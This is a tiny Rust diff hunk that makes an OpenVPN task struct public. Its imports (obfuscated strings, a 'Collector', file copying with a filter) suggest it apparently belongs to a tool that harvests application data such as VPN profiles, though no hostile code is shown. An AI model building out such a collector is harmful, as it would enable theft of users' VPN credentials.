@@ -32,7 +32,7 @@ use filesystem::{FileSystem, copy_content_with_filter};
 use obfstr::obfstr as s;
 use tasks::{Task, parent_name};
 
-pub(super) struct OpenVPN;
+pub struct OpenVPN;
 
 impl<C: Collector, F: FileSystem> Task<C, F> for OpenVPN {
     parent_name!("OpenVPN");
